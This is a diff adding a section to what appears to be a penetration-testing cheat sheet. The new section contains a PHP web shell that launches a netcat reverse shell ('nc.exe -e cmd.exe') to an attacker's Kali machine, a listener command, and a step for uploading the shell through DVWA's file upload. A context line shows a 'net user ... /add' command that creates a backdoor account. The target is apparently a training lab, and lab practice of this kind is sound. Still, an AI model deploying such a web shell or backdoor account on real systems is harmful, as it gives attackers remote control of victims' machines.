@@ -167,4 +167,20 @@ net user secretuser 1q2w3e4r! /add
 ```
 
 - Netcat Reverse Shell for Windows
-- 
+```php
+<?php
+	header("Content-type: text/plain");
+	$ip = "Kali-IP";  // Change to Kali IP
+	$port = "443";    // Change to any port number not in use
+	$cmd = "nc.exe -e cmd.exe ".$ip." ".$port;
+	echo "\nExecuting : ".$cmd."\n";
+	$output = system($cmd)
+?>	
+```
+
+- Run Netcat on Kali to listen to port
+```
+sudo nc -l -p <port-number>
+```
+
+- Upload Netcat reverse shell and `nc.exe` on the file to DVWA file upload
